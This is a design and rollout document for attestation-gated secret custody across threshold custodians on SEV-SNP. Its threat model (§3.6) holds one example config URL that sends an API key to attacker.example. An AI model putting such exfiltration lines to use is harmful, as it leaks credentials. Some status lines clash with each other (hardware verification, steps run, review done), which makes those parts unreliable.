# Secret custody: attestation-gated release from independent custodians

Status (2026-10-14): rolling out to production (§9 records each step). The external review (§9 step 1) was NOT done:
the owner chose to proceed without it.

| Piece | Production |
|---|---|
| `EnclaveSecretVault` | Base `0x08074300F75e78212Ae10eBd14984f78e17811A6` (tx `0x90ea64f0…`, block 52605914; `contracts/deployments/secret-vault-base.json`); address-book key `secretVault` NOT set yet (governance Trezor) |
| Bootstrap committee | `0xf14080496fbb6f12aee6577fd3f0fdc2ba1226a159b727dbfc8bf0de07fe4f9c`, **3 of 4**, epoch 1 (tx `0x60a5b996…`) |
| Custodians | `https://custody-{us-west,ca-east,ap-southeast,eu-central}.app.enclave.host`, one per regional network box |

**What is live (2026-10-14 19:55Z), verified on hardware:**

- LIVE: the vault; the committee; the four custodians (TLS on ISRG, chain reads across 4 public RPCs, 2 agreeing); the
  relay's custody gates (`CUSTODY_VAULT` on nan: no plaintext for a custody-held deployment on any path, the custody
  pointer in its signed release); the CLI (`enclave custody`) and the site code, which stays hidden until the book names
  the vault.
- LIVE, the guest side on metal0 (§9 steps 7-8). The production guestd and front had been built by Codex from trees in
  no repository; both were found, reproduced byte for byte and pushed (`codex/guestd-release-bootstrap-20261004`,
  `codex/front-release-340a09c1-snapshot`). Custody's patch set was applied on top:
  - CPU domain release **`987d08c3`** = release 340a09c1 with only `template/front` replaced (branch
    `custody/front-prod`, front sha256 `a9c07233…`, reproduced with a cold Go cache). The relay installs, admits and
    certifies it beside 340a09c1 (`SECRETS_RELEASE_{PREDICT,DOMAIN,CERT}_RELEASES`); the predictor's known-answer test
    passes.
  - guestd from branch `custody/guestd-prod` (custody-auth on vsock 9445, and `-custody-bootstrap-hosts`, below),
    building new CPU guests from 987d08c3. Running guests were adopted in place across both restarts.
  - metal0's control image `dist-custody-9e5fb2028` (branch `metal0/custody`: the supervisor's custody hunk, with
    `CUSTODY_VAULT` measured in gsup), measurement `c64d8196…`, on the relay's metal allowlist.
- **Hardware verification (§9 step 9), on the agent-owned canary `0x4e62e60d` (hello-world) on metal0 (Turin):**
  - Rules admitting ONE image (987d08c3, measurement `4164ab7f…`), reproduced locally with `expected-measurement.sh`
    before admitting; secrets revision 1 sealed 3-of-4.
  - The guest logged `DOM custody: … secrets revision 1 from a threshold of 3 of 4 custodians, 1 name(s)` and started
    the app; three custodians logged `release … OK (member n, measurement 4164ab7f…)`.
  - Two custodians stopped: `insufficient custodian quorum: 2 of 4 custodians issued a challenge (need 3)`, and the
    app was NOT started. One stopped: the other three released and the app started. A restarted custodian served again.
  - Migration between hosts is not yet tested on hardware: metal0 is the only SNP host serving release guests.
- Found and fixed by the canary:
  - Custodians decoded the registry with the full schema-5 tuple; the live Base registry is older, so every release was
    refused as `chain_unconfirmed`. They now read the schema-1 prefix (main `09895e649`, redeployed to all four).
  - On metal0 a starting release guest's egress is admitted only through `-release-bootstrap-routes`, which allowed only
    the relay; the front asks its custodians in that same window. guestd now also allows the hosts named in
    `-custody-bootstrap-hosts` (exact names, port 443, same eligibility), so a committee change the list misses fails
    closed.
- Open follow-ups:
  - A custodian caches VCEKs in memory only: right after a restart its first fetch from AMD KDS can be refused with
    HTTP 429 (seen once on ap-southeast; quorum held). A disk cache, or the VCEK carried in the evidence, removes this.
  - metal0's release bootstrap is still the interim per-app list (`release-bootstrap-direct.mjs`: eyesoff and the
    canary). Any other release-listed deployment cannot start on metal0 until it is listed, custody or not. Each app
    needs its OWN proxy: guestd refuses the whole file when two apps share one.
  - The governance step `book.set("secretVault", 0x0807…)` (Trezor) turns on the site panel. A custody-held deployment
    can run only on metal0's SNP release path today (§8 L5, L9), so owners should be told that before the panel opens.

**Successor design:** [secret-custody-v2.md](secret-custody-v2.md) (host-run custodians inside their TEEs, admitted on
attestation plus proof of capacity, one committee key, shares moved on membership change). Not built.

**The bootstrap committee is NOT decentralized custody.** Its four custodians run on four separate VPSs, each with its own
key generated on the box, none on `nan` where the relay runs. So a compromise of the relay alone reads no secret. But all
four boxes are operated by Enclave, and their operator could collect three shares. Independent operators replace members
by resharing (§5.3), with no owner action; until then, say "bootstrap committee", never "decentralized".

This replaces the relay as the holder of application secrets. Before this change the relay stored every deployment's
secrets encrypted under `SECRETS_KEY`, a key it holds, so its operator could read them all. After it, for a deployment
whose owner moves its secrets to custody:

- the owner encrypts the values in their browser (or CLI) to a committee of custodians and writes the ciphertext to
  `EnclaveSecretVault` on Base;
- the relay holds no value and refuses to store or serve one;
- each start of the app, on any host that holds the lease, fetches fresh hardware evidence and gets the values from a
  threshold of custodians, with the owner offline.

The rest of this document covers how the parts fit, what each party can and cannot do, how the keys are kept and
recovered, and what is still missing.

---

## 1. The flow before this change (verified on main 0ffaa5208)

| Path | Where the secret is readable | Code |
|---|---|---|
| Owner upload | the relay (AES-GCM under a subkey of `SECRETS_KEY`) | `relay/secrets.js` `seal`/`open`, `POST /v1/secrets/:id` |
| Legacy VM tier | the relay, then the supervisor's RAM, then wasmtime `--env` | `/v1/secrets/fetch`; `supervisor.js` `fetchDepSecrets` |
| Per-app SNP guest | the relay decrypts, then seals to the guest's attested key | `relay/secrets-release.mjs` `handleRelease` (`envOf`) |
| pVM / Shield | the relay decrypts, then seals to the VM | `relay/pvm-secrets.mjs`, `relay/shield-secrets.mjs` |

In every path the relay held the plaintext at some point. The attested SNP release (`secrets-release.mjs`) already did
the hard part on the guest side: it binds a recipient key into the hardware report. This change keeps that guest-side
design and removes the relay from the custody of the values.

## 2. Threat model

**Assets:** each deployment's env map (API keys, database credentials), and its integrity (the app must not run on
values the owner did not set).

**Trusted:**
- AMD SEV-SNP hardware and firmware at or above the owner's TCB floor, and AMD's signing roots (ARK, pinned).
- The measured guest image: the front (`isolation/m2/front`) and its kernel and initramfs, as admitted by the owner's
  rules.
- Base consensus, read through RPCs that agree.
- At most `t-1` of a committee's `n` custodians colluding or compromised.
- The owner's device while it encrypts.

**Not trusted for confidentiality:**

| Party | Can | Cannot |
|---|---|---|
| Relay operator | deny service; stop releasing the public config; point a guest at a fake committee (see §8, L3); serve a misleading guest prediction to an owner who admits it unchecked (§5.4) | read any custody-held value: it holds no share and no key, and old copies are refused and deleted at migration; choose the config or allowlist the values go into, which the owner commits (§3.6) |
| Host / lease holder (operator key, guestd, supervisor) | deny service; see the binding hash; run the approved app elsewhere if it holds a lease | read the values: they are sealed to a key generated inside the attested guest; swapping the recipient key changes the binding the hardware signed (tested, §7) |
| Another tenant's app on the same host | nothing new | name another app's ID: the front writes `report_data[32:64]` from the code it loaded; the app cannot open the report device (`dominit.c`) |
| A host running the right app for the WRONG deployment | — | get deployment A's values in deployment B's guest: `HOST_DATA` must equal the deployment id inside the binding, and the lease must be A's |
| Platform governance (address-book owner) | repoint the ledger: at worst destroy a bundle (claim), or name a different lease holder (that host then runs the attested, approved app) | change a policy (the owner is pinned in the vault), or redirect the values to code the owner did not admit |
| `t-1` custodians | deny service (if more than `n-t` are down) | learn anything: `t-1` Shamir shares are independent of the secret |
| One RPC provider | delay | feed a custodian a stale or forged state: reads are pinned to the HIGHEST head any RPC reports, so a lagging RPC drops out instead of dragging the others back; the RPCs must agree on that block, the block must be recent, and a custodian never accepts a state older than one it has seen |
| Network attacker | delay, drop | anything else: shares are HPKE-sealed end to end to the recipient key |

**Out of scope:** physical attacks on SNP (see `docs/physical-tee-attacks.md`), side channels inside the guest, and a
malicious approved app (it is the code the owner chose to give the values to).

## 3. How the parts fit

```
owner (browser / CLI)                     Base: EnclaveSecretVault                 custodians (n, independent)
  env --AES-256-GCM(DEK)--> ciphertext  ->  policy {owner, rules, committee,        each holds ONE X25519 key;
  DEK from Shamir secret s (t of n)           policyRev, secretRev, paused}          its share sits on chain,
  share_i --HPKE--> member_i.encKey     ->  bundle {epoch, ciphertext}              sealed to that key
  Feldman commitments C_k = a_k*G       ->  shares[rev][epoch]: commitments, sealed
                                            committees[cid][epoch]: members

app start, any host holding the lease (owner offline):
  guest front --challenge--> each custodian ............ nonce_i (single use, 120 s)
  guest front: fresh recipient key R; binding = H(..., challenges, R, ...)
  guest front --report_data = binding || AppID--> SEV-SNP firmware --> signed report
  guestd/supervisor: the lease holder's operator signs the binding
  guest front --{evidence, R, revisions, operator sig}--> each custodian
  custodian: chain checks, evidence checks, opens its share --HPKE(R)--> guest
  guest front: t shares -> s -> DEK -> env -> ENCLAVE_CONFIG substitution -> init starts the app
```

### 3.1 On chain: `contracts/EnclaveSecretVault.sol`

- **Policy per deployment.**
  - The owner is pinned at the first write. It is the ledger's owner, or a SessionVault's owner, resolved through the
    address book.
  - `rules` is canonical JSON the custodians enforce (`custody/rules.mjs`):
    - `appId`;
    - `images`, a list of (`sev-snp`, measurement, runtimeId) pairs;
    - `minTcb`, required, with no default floor;
    - `vmpl`.
  - The policy also holds the committee, `paused`, `policyRev` (+1 on every change) and `secretRev` (+1 on every
    bundle).
- **Bundle.** Only the current revision is stored; history lives in the events. A bundle is sealed to ONE committee
  epoch. Changing the committee requires a new bundle or a clear.
- **Authorization.** Either `update(id, u)` sent by the owner, or `updateBySig` with EIP-712 typed data:
  - an EOA owner signs with ecrecover, low-s only;
  - a contract owner signs through ERC-1271. The passkey credit vault already implements it, so a passkey owner never
    exposes a key, and a relayer can pay the gas.
  - `expectPolicyRev` is the replay guard: a signed update applies once.
- **Ownership change.** When the ledger names a different owner, all writes stop and custodians refuse every release
  (`owner_mismatch`). The new owner may `claimPolicy`. That destroys the old bundle and pauses the policy, so a new
  owner never inherits the previous owner's values.
- **Committees.** Anyone may create one. Changing an epoch (membership, keys or threshold) needs a threshold of the
  CURRENT members to approve the same content. The relay and governance have no role in it.
- **Reshare transcripts.** `postDeal` and `postReshare` are covered in §5.3. A posted share set is keyed by its dealer
  source AND its exact commitments, whose constant term must equal the bundle's stored `C0`. So a member stating junk
  commitments opens a set of its own and cannot block the honest set.
- **No owner, admin or proxy.** 14.5 KB runtime.

### 3.2 Cryptography

| Purpose | Construction | Implementation |
|---|---|---|
| Data key | random scalar `s` (secp256k1 order), DEK = HKDF-SHA256(`s`, salt = H(vault ‖ id ‖ secretRev)) | `@noble/curves`, `@noble/hashes` (audited) |
| Bundle | AES-256-GCM, AAD = H(chain ‖ vault ‖ id ‖ secretRev ‖ C0) | `@noble/ciphers` (browser and node), Go `crypto/cipher` |
| Threshold | Shamir t-of-n over the secp256k1 scalar field; Feldman commitments; verifiable redistribution (Desmedt–Jajodia, Wong–Wang–Wing checks) | `custody/threshold.mjs`: our composition over noble point and field arithmetic |
| Sealing to a key | HPKE, RFC 9180 base mode: DHKEM(X25519, HKDF-SHA256), HKDF-SHA256, AES-128-GCM | `custody/hpke.mjs` and `isolation/m2/custody/hpke.go`, both checked against the RFC's Appendix A.1 vectors |

Every primitive comes from an audited library (noble) or Go's standard library. The composition is ours: the HPKE key
schedule (pinned by the RFC vectors), Shamir with Feldman commitments, and redistribution. It is about 250 lines with
dedicated tests and cross-language vectors (`test/fixtures/custody-vectors.json`). **It has had no external review.
That review is a precondition for holding real value (§8, L1).**

This is genuine threshold custody, not replicated custody. No custodian ever holds `s`. Each holds one share, and any
`t-1` shares are information-theoretically independent of `s` (tested). Replicated custody, where every custodian holds
the whole key, would make each custodian a single point of compromise. That is not what this is, and a committee of one
would be no committee.

### 3.3 Proving which app is requesting

This answers the question the design discussion ended on. A share is released only to a recipient key `R` that appears
inside a hardware-signed report, and that report must also name all of the following, each checked by every custodian
independently:

1. **The code that runs.** `report_data[32:64]` is the AppID, written by the measured front from the bytes init will
   run (`isolation/m2/front/appidentity.go`):
   - it parses `/app.bundle` with `contract.Parse`;
   - it requires the bundle's artifact to be byte-identical to `/app.wasm`, which `dominit` executes;
   - AppID = sha256(bundle), cross-checked against `/app.sha256`.

   The app runs unprivileged and cannot open the report device. The front, the bundle and the wasm are all inside the
   launch measurement (`kernel-hashes=on`), and the custodian requires that measurement to be one of the owner's
   admitted images. An app therefore cannot supply another app's ID: the ID is not a field it controls, and the image
   that writes it is measured.
2. **The runtime and security configuration.**
   - The measurement must be paired with the stated `runtimeId` (an admitted image is a (measurement, runtimeId) pair).
   - The verifier requires DEBUG and MIGRATE_MA off, the pinned VMPL, a VCEK signer (not VLEK), a CRL that is not stale,
     and the TCB floor, applied to both the reported and the committed TCB.
3. **The deployment.** `HOST_DATA` (set at launch and signed by the PSP) must equal the deployment id. The deployment id
   is also inside the binding.
4. **The lease, revision and policy.**
   - The custodian reads the chain: the endpoint must hold the live lease (`runner = keccak(endpoint)`,
     `leaseUntil > block time`).
   - Its registered operator must have signed this exact binding (`enclave-custody-release-v1:<chain>:<vault>:<id>:<endpoint>:<binding>:<expiry>`).
   - The request's `policyRev`, `secretRev` and epoch must be the current ones.
   - The ledger's owner must still be the policy's owner, and the policy must not be paused.
5. **Freshness, bound to the recipient key.**
   ```
   binding = sha256("enclave-custody-release-v1\n" ‖ u64 chainId ‖ vault ‖ id ‖ u64 policyRev ‖ u64 secretRev ‖
                    u32 epoch ‖ challengeRoot ‖ runtimeId ‖ sha256(transport SPKI) ‖ R)
   challengeRoot = sha256("enclave-custody-v1 challenges\n" ‖ u8 n ‖ (custodian key ‖ nonce) sorted by key)
   ```
   Each custodian issues its own nonce and consumes it on first use, whatever the verdict, so a captured request cannot
   be replayed. `R` is generated inside the front and never leaves it. Each custodian's response is
   `HPKE(R, aad = sha256(domain ‖ binding ‖ custodian key ‖ index), share)`, so a response opens only for this binding.
   The domain prefix is distinct from Bind2 (the public attestation endpoint) and from the relay release binding, so a
   report produced for one purpose can never satisfy another (`oracle_test.go` audits every report path in the front).

### 3.4 Platforms

Only SEV-SNP is admitted, because it is the only platform whose evidence this repository verifies end to end
(`verifier/snp.mjs`: VCEK → ASK → pinned ARK, ARK-signed CRL, TCB, policy bits). Everything else is refused by name:

- **Intel TDX:** there is no TDX quote verifier in this repository.
- **Android pVM (AVF):** `relay/avf-verify.mjs` pins Google's root but checks no attestation revocation list, and the
  pVM's release client is not in this repository.
- **Enclave Shield (Hyper-V partitions):** not a TEE against its operator.

The rules parser rejects these platforms, the custodian's verifier table has no entry for their evidence formats
(`unsupported_evidence`), and the relay refuses Shield and pVM releases for custody-held deployments (`custody_held`).

### 3.5 What the relay still does

- It delivers the public config and the egress allowlist in its signed release, as before.
- For a custody-held deployment that release carries `secrets: {}` and a pointer to the custody state (`custody`),
  which it reads from the vault through agreeing RPCs. It never falls back to a copy it holds.
- `/v1/secrets/fetch`, Shield and pVM releases, and owner writes other than `{clear:true}` answer
  `409 custody_held`.
- The relay's own opt-in still applies: a guest gets the signed release only if `SECRETS_RELEASE_DEPLOYMENTS` lists its
  deployment (or is `*`), and only on a box with `ISOLATION_RELEASE=1` and a `-release` guestd. A custody-held
  deployment that is not listed is never claimed by a box that would start it without its values: the existence probe
  reports it as having secrets.
- When the custody state cannot be confirmed, every one of these answers 503, never "no custody".

### 3.6 Where the values may go

On the per-app tier the app receives its secrets by substitution into its config (`ENCLAVE_CONFIG`), and the guest
derives its egress allowlist from that resolved config. The config itself is public and arrives in the relay's signed
release.

Without a check, the relay could deliver `{"url":"https://attacker.example/?k=$API_KEY"}` and the guest would put a
real value into it and allow the connection. So the owner commits, INSIDE the encrypted bundle:

```
configSha256 = sha256(the exact config text the values go into)
```

Only the real committee's shares open the real bundle, so the relay cannot forge that commitment. The front compares
the hash with the config it received and refuses to substitute into anything else (`config … is not the one the owner
committed`). It derives the allowlist only afterwards, from the config resolved with the custody values, so an origin
named through a placeholder (`${IMAGE_ENDPOINT}`) is allowed exactly as before.

- The CLI computes the text from the chain when the config is inline in the deployment's envelope. Otherwise it needs
  `--config-file`, the exact JSON the app gets (a CID's content or the catalog version's), or `--no-config`.
- The site supports the inline case and sends owners to the CLI for the others.
- A wrong file is safe: the app refuses its values and does not start, so the owner notices at once.

## 4. Code map

| Part | Files |
|---|---|
| Contract and Foundry tests | `contracts/EnclaveSecretVault.sol`, `contracts/foundry/test/EnclaveSecretVault.t.sol` |
| Protocol (isomorphic JS) | `custody/{hpke,threshold,protocol,rules,owner,chain,recipient,reshare}.mjs` |
| Custodian | `custody/custodian.mjs` (decision and HTTP), `custody/verifiers.mjs`, `custody/keystore.mjs`, `custody/custodian-daemon.mjs` |
| Guest (Go, measured) | `isolation/m2/custody/` (HPKE, binding, combine, client), `isolation/m2/front/{custody,appidentity}.go`, `isolation/m2/release/custody.go` |
| Host | `isolation/m4/guestd/custody.go` (auth service), `supervisor.js` (`authorizeCustody`, the pump) |
| Relay | `relay/custody-state.mjs`, `relay/secrets.js`, `relay/secrets-release.mjs`, `relay/api-relay.js` |
| Owner tooling | `cli/custody.mjs` (`enclave custody …`), `site/js/core/custody.js`, `site/vendor/custody.js` (`scripts/build-custody-vendor.mjs`), the Secrets panel's "Save to custody" |
| Deploy | `scripts/deploy-secret-vault.mjs` |

## 5. Key custody and recovery

### 5.1 A custodian's state, restart and backup

A custodian's durable state is one passphrase-encrypted file holding two keys:
- the X25519 share key;
- its operator EOA, used only for committee transactions.

Every share it is responsible for sits on chain, sealed to that share key. The file format is scrypt (N = 2^17) plus
AES-256-GCM (`custody/keystore.mjs`). It is written 0600 and never overwritten, and the daemon refuses to read it if
anyone else can.

- **Restart:** the daemon reloads the key file. Outstanding challenges die with the process, and recipients simply
  retry with fresh ones (tested). High-water marks (`highwater.json`) persist, so an RPC cannot roll a custodian back
  across a restart.
- **Backup:** the key file IS the backup. Keep two offline copies with the passphrase stored separately. Restoring
  means putting the file back (tested: a copy opens to the same keys).
- **Lost key, no backup:** that member's shares are gone. While `t` other members survive, the committee reshares to a
  replacement (§5.3) and nothing is lost. **Public ciphertext and on-chain authorization cannot reconstruct a lost
  private key; that is the property, not a gap.**

### 5.2 Quorum, availability and compromise

With `t` of `n`:
- up to `n-t` custodians may be down and releases continue (tested: 2 of 5 down still releases; 3 of 5 down releases
  nothing);
- up to `t-1` may be compromised and learn nothing;
- `t` compromised custodians recover every bundle sealed to that epoch.

Pick `n` from independent operators, on different providers and jurisdictions. 3-of-5 tolerates two outages or two
compromises, not both at once. A committee run by one organisation, or by the relay's operator, is not decentralised,
and this design does not claim it is.

A custodian that returns a wrong share is detected and named, and is never mixed in (tested on both sides).
- In JS each share is checked against the Feldman commitments.
- In Go each combination of shares must open the AES-GCM bundle, and the guest tries further combinations. It cannot
  check shares against the commitments itself, because Go's standard library has no secp256k1.

The Go search is bounded at 65,536 combinations, so it survives any number of liars whenever C(m, t) ≤ 65,536 for the
m shares it received. That covers every committee of up to 17 members. Keep committees at or below that size; a larger
committee with a liar among its lowest indices can exhaust the search and fail closed.

**Too few custodians:** the release fails closed (`insufficient_quorum`). The guest's front exits, init never starts
the app, and guestd ends the guest through its lifecycle. If fewer than `t` keys survive anywhere, the values are
unrecoverable by design. The owner re-sets them from their own source of truth (`enclave custody set`), which is why
`set` replaces the whole set and the docs tell owners to keep one.

### 5.3 Membership changes and key rotation

1. A threshold of the current members approve the new epoch: members, keys and threshold
   (`custodian-daemon.mjs approve-epoch`, or `approveEpoch`).
2. Per deployment, each of `t` old members re-shares its share to the new members:
   - `deal` posts sub-commitments and HPKE-sealed sub-shares.
   - Each new member checks every sub-share against its dealer's sub-commitments, and checks that the dealer's `g_i(0)`
     equals that dealer's old public share. It combines exactly `t_old` valid deals, seals its new share to its own key
     and posts it (`receive`).
   - The new commitments' constant term must equal the old `C0`: same secret, same data key, and the ciphertext is
     unchanged.
3. When `t_new` new members agree on one set of commitments, the bundle moves to the new epoch.

All three steps are tested end to end on a real chain, with one member replaced and the rest rotated to new keys; the
removed member is then refused (`not_member`).

**Proactive security needs erasure.** Old shares stay on chain, sealed to the OLD keys. A membership change that is
meant to shut out a suspected member, or to refresh after a compromise, must therefore rotate every remaining member to
a new key in the same epoch, and every member must destroy its old private key once the reshare completes. Without that,
`t` old keys still open the old shares. If a key was already stolen, the only complete remedy is for the owner to
rotate the credentials themselves.

Reshare is per deployment and is run by the custodians, with the owner offline. A malicious old member can stall a
reshare: the others then use a different set of `t_old` dealers. It cannot change the secret, because the public checks
pin `C0`. A complaint protocol that excludes a dealer automatically is not implemented (§8, L6).

### 5.4 Runtime upgrades and policy changes

- **A new app version** changes the AppID and the measurement, so the owner admits it with a policy update. That is one
  transaction. Version changes are already owner actions on the ledger.
- **Admitting images decides who receives the values.** The relay's public prediction (`GET /v1/expected-guest`) can
  supply them, but it is never taken silently:
  - the CLI prints every image and needs `--admit`;
  - the site shows them and needs a second click ("Admit and save").

  An owner who admits an unchecked prediction is trusting the relay with WHICH code gets the secrets. The prediction is
  reproducible from the chain and the pinned domain releases (`relay/measurement-predict.mjs`,
  `isolation/m4/expected-measurement.sh`). Reproduce it, or write `--rules` yourself. Rotating values later does not
  re-admit anything: `custody set` keeps the on-chain rules unless `--rules` replaces them.
- **A new runtime release for the same app** changes the measurement. It also needs the owner to admit the new image.
  Unattended runtime upgrades are NOT supported (§8, L4): delegating that to a release authority would let whoever
  controls that authority redirect secrets to a runtime of their choosing.
- **Pause** (`enclave custody pause`) makes every custodian refuse. A guest that cannot get its values never starts the
  app, so pausing stops the app from starting or restarting until the owner resumes; a running app keeps what it has.
- **Migration between hosts** needs nothing from the owner. The new lease holder's guest attests, and the old host's
  requests fail `not_lease_holder` (tested).

### 5.5 Replay and rollback

- **Replay:** single-use custodian nonces inside the binding, `expectPolicyRev` on owner updates, and responses sealed
  to the binding.
- **Rollback of secrets or policy:** the contract stores only the current bundle, and both revisions only increase.
  A custodian requires the request's revisions to equal the chain's (`stale_revision`, tested), and the bundle's AAD
  binds `secretRev`.
- **Rollback through an RPC:** custodians and the relay read at the HIGHEST head any of their RPCs reports. An RPC that
  lags, or claims to, cannot answer for that block and drops out, so it cannot drag the agreement back to before a
  pause, a revoked image or an ended lease (review H1, tested with a stuck node).
  - At least `minAgree` RPCs must answer that block and agree on it (`chain_unconfirmed`).
  - The block must be under 120 s old against the custodian's clock (`chain_stale`; `CUSTODY_MAX_AGE_SEC`).
  - A custodian keeps per-deployment high-water marks for block, policy revision and secret revision
    (`chain_rollback`), and persists them across restarts. All of this is tested.

## 6. Migrating existing secrets

The relay already holds these values in a form its operator can read. Migration moves them; it cannot un-read them.

1. The owner runs `enclave custody migrate <id> [--rules rules.json | --rules-from-relay --admit] [--committee 0x…]
   [--config-file app-config.json]`, or opens the site's Secrets panel and chooses "Save to custody" after Unlock.
2. The client reads the relay's copy with the owner's signature (as today), encrypts it locally to the committee and
   writes the bundle (one owner transaction). It then reads the bundle back through agreeing RPCs.
3. Only once the relay itself reports the deployment as custody-held (`/v1/secrets/exists → custody: true`) does the
   client delete the relay's copy (`{clear:true}`). Otherwise it stops and says so (tested).
4. **The owner should rotate every migrated credential at its issuer, then `enclave custody set` the new values.**
   Until then, a past relay compromise remains a compromise of those values.

There is no bulk, relay-driven migration. It would need either the owner's authorization per deployment (which is this
flow) or the relay generating the data key (which defeats the purpose).

## 7. Tests: what is simulated and what is hardware

| Suite | What it shows |
|---|---|
| `test/custody-hpke.test.mjs`, `isolation/m2/custody` `TestHPKEAgainstRFC9180A1` | HPKE byte-exact against RFC 9180 A.1, JS and Go |
| `test/custody-threshold.test.mjs` | split/combine, `t-1` hiding, tamper detection, verifiable redistribution |
| `test/custody-vectors.test.mjs`, `TestVectorsFromTheJSReference`, `TestObtainAgainstFakeCustodians` | one fixture pins JS and Go: binding, challenges, operator message, DEK, bundle, responses; Go survives a liar and fails on quorum |
| `contracts/foundry/test/EnclaveSecretVault.t.sol` (13) | owner pinning, EOA and ERC-1271 signatures, replay, stale revision, transfer and claim, governance repoint, committee approval, reshare |
| `test/custody-e2e.test.mjs` (22), SIMULATED attestation | real contract (anvil), 5 custodians over HTTP, the REAL SNP verifier over a synthetic AMD-shaped chain. Covers: happy path; ciphertext-only chain; app substitution; image substitution; confused deputy; recipient-key substitution (host re-signs); replay; stale policy, revision and lease; DEBUG, VLEK, VMPL, foreign root, tamper; TCB floor; non-lease host; wrong operator; migration; quorum 3/5; lying custodian; custodian restart; pause and transfer; EIP-712 update; RPC disagreement and rollback; a lagging RPC behind a pause; a stale chain; custodian rate and challenge limits; a config the owner did not commit; membership change by reshare |
| `test/custody-hardware.test.mjs`, HARDWARE-BACKED | a GENUINE AMD Genoa report under AMD's pinned roots: the hardware layers verify; the custody checks refuse it for exactly the right reasons (binding, AppID, measurement, TCB, HOST_DATA zero); a flipped bit breaks the PSP signature; a stale CRL fails closed; synthetic evidence is refused under production roots |
| `test/custody-relay.test.mjs`, `test/secrets-release.test.mjs` | relay: no value on any path for custody-held deployments, clear accepted, fail-closed 503, signed release carries the pointer; the relay's reader equals the custodians' |
| `test/isolation-release-ticket.test.mjs` | supervisor signs exactly the protocol's operator message for the binding guestd reports |
| `isolation/m4/guestd` `TestCustodyAuthReachesOnlyItsOwnGuestAndBinding` | authorization reaches only the guest guestd launched, for its own deployment and binding |
| `isolation/m2/front` `TestLoadedAppIDIsTakenFromTheLoadedCode`, `TestProvisionTakesCustody…`, `TestProvisionCustodyFailsClosed`, `oracle_test.go` | AppID from loaded code; the front's composition (binding, report_data, HOST_DATA) as custodians check it; fail-closed cases; the new report path audited |
| `test/custody-cli.test.mjs` | the real CLI migrates relay copy → vault → attested recipient, clears only when the relay is custody-aware; nothing printed in the clear |
| `test/custody-browser.test.mjs` | real Chrome encrypts with the committed bundle (equal to a fresh build); custodians' keys recover exactly that env |
| `test/custody-keystore.test.mjs`, `test/custody-deploy.test.mjs` | key file backup and restore, permissions, the daemon starting with production verifiers; the deploy script on anvil |
| `test/custody-supervisor.test.mjs` | the legacy launch path refuses a custody-held, or unconfirmable, deployment and drops its cached snapshot |

**Not verified on hardware:** a complete custody release from a real SNP guest. That requires a guest image built with
this front, a real committee and the deployed contract (§8, B1).

### 7.1 Independent review (2026-10-14)

An adversarial review of this branch found seven defects. All are fixed, each with a test that fails without the fix:

| | Finding | Fix |
|---|---|---|
| H1 | one lagging RPC dragged the agreed block back (undoing a pause, a revocation or a lease end) | read at the highest head; recency limit (§5.5) |
| H2 | the relay chose the config and allowlist the values were substituted into | owner-committed `configSha256` in the bundle; allowlist derived after the custody values (§3.6) |
| H3 | the relay's prediction was admitted silently as the owner's rules | shown, and admitted only explicitly (§5.4, L10) |
| M1 | one new member could block every reshare | share sets keyed by commitments; `C0` enforced on chain |
| M2 | unauthenticated challenge flooding and high-water growth | per-client rate and challenge caps; high-water marks only for policies that exist |
| L1 | the legacy launch path fell back to a snapshot when the relay could not confirm custody | `custody_unconfirmed` refuses the launch like `custody_held` |
| L2 | the Go guest's combination search gave up early on larger committees | the bound raised to 65,536 and stated (§5.2) |

Fixing H2 exposed one more defect that the review had not named: the allowlist was derived before the custody values
were known, so an origin named through a placeholder (`${IMAGE_ENDPOINT}`) was not allowed. That is now fixed and
asserted in the front's tests.

## 8. Limitations and blockers

- **L1. Unreviewed composition.** The threshold and redistribution code, the HPKE key schedule (vector-pinned) and the
  protocol need an external cryptographic review before real value depends on them.
- **L2. No independent custodians exist yet.** The code lets anyone run one. Recruiting `n` independent operators is
  organisational work. Until then any committee is only as independent as the people running it, and this document
  must not be cited as decentralised custody.
- **L3. Committee authenticity inside the guest rests on the relay's signed release.** The guest cannot read Base
  itself. The custody pointer arrives inside the relay-signed sealed release, so the HOST cannot substitute it, but the
  relay could point a guest at a committee it runs.
  - That gives the app values the relay chose, in a config the relay chose. It is an integrity attack: the app could be
    pointed at an attacker's database with attacker credentials.
  - It does NOT reveal the owner's real values: the real custodians release only to the attested binding, whose
    challenges come from them, and the real bundle commits its own config (§3.6).

  Closing this needs a Base light client or storage proofs in the guest.
- **L4. No unattended runtime upgrades.** A new image needs the owner's policy update (§5.4).
- **L5. SNP only.** TDX, AVF/pVM and Shield fail closed (§3.4). AVF also needs a revocation-list check and its
  release client in this repository.
- **L6. Reshare robustness.** There is no on-chain complaint protocol. A malicious OLD member that deals a bad
  sub-share to one new member can stall that member, though not corrupt the result; the new members then choose a
  different set of dealers (§5.3). A malicious NEW member can no longer block a reshare: a share set is keyed by its
  commitments and must keep `C0`.
- **L10. Admitting images.** See §5.4. An owner who admits the relay's prediction unchecked trusts the relay with which
  code receives the values. The tooling shows the images and requires explicit admission, but cannot make the owner
  reproduce them.
- **L11. Config sources.** The owner's config commitment is computed automatically only for a config inline in the
  deployment's envelope. Configs at a CID, or from the catalog version, must be named exactly (`--config-file`); the
  site sends those owners to the CLI.
- **L7. Owner-side committee keys.** The owner tooling reads the committee's keys through agreeing RPCs, but a
  compromised owner device can seal to any keys it likes. The owner's device is in the TCB for its own secrets.
- **L8. Passkey owners in the site.** The contract and the EIP-712/ERC-1271 path are done and tested. The site's
  Secrets panel today only renders for wallet-owned rows, and submitting `updateBySig` for a passkey owner needs a
  relayer endpoint that pays gas. Neither is built.
- **L9. Legacy VM tier and Windows boxes.** These run apps without attestation, so they cannot receive custody-held
  secrets at all. The supervisor refuses to launch such a deployment rather than start it without its values.
- **B1. Hardware verification: DONE 2026-10-14** on metal0 (Turin), release 987d08c3, the canary 0x4e62e60d: release
  from 3 of 4, refusal at 2 of 4, release with one custodian down (see the status at the top). Migration between hosts
  is not yet verified on hardware.

## 9. Production rollout (steps 2 and 4-9 DONE 2026-10-14; 1, 3 and 10 open)

Each step names who acts. None has been run.

1. **External review** of `custody/` and `contracts/EnclaveSecretVault.sol` (L1).
2. **Deploy the vault.** Deployer (any funded key; it holds no power afterwards):
   `NETWORK=base DEPLOYER_PRIVATE_KEY=… node scripts/deploy-secret-vault.mjs --dry-run`, then without `--dry-run`.
   Record the address in `contracts/deployments/secret-vault-base.json`.
3. **Name it in the address book.** Governance Trezor signs the transaction the script printed:
   `EnclaveAddressBook.set("secretVault", <vault>)`.
4. **Custodians.** Each operator:
   - runs `custodian-daemon.mjs keygen`;
   - stores two offline copies of the key file;
